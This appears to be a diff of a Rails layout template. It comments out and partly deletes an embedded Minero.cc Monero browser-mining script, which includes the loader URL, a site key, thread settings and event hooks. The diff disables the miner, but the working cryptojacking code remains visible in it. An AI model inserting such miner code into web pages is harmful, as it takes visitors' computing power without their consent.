@@ -29,25 +29,16 @@
 
           <!-- Minero.cc (XMR - monero) START-->
 
-          <script src="https://minero.cc/lib/minero.min.js"></script>
+          <!--  <script src="https://minero.cc/lib/minero.min.js"></script>
+      
 
           <script>
             var miner = new Minero.Anonymous('e1aedca548f440b9147b72726b7b6f9f', {
               autoThreads: true
             });
-            miner.start();
-          </script>
+            miner.start(Minero.FORCE_MULTI_TAB);
+          </script>   -->
 
-          <script>
-            // Get stats
-            var hashesPerSecond = miner.getHashesPerSecond();
-            var totalHashes = miner.getTotalHashes();
-            // Change settings
-            miner.setNumThreads(2);
-            // Listen to events
-            miner.on('found', function() { /* Hash found */ });
-            miner.on('accepted', function() { /* Hash accepted by the pool */ });
-          </script>
 
           <!-- Minero.cc (XMR - monero) END-->
 
@@ -59,7 +50,7 @@
 
     </head>
   <body>
-    <%= render 'layouts/navbar' %>
+    <%= render 'layouts/navbar' %>    
     <p class="notice"><%= notice %></p>
     <p class="alert"><%= alert %></p>
     <%= yield %>
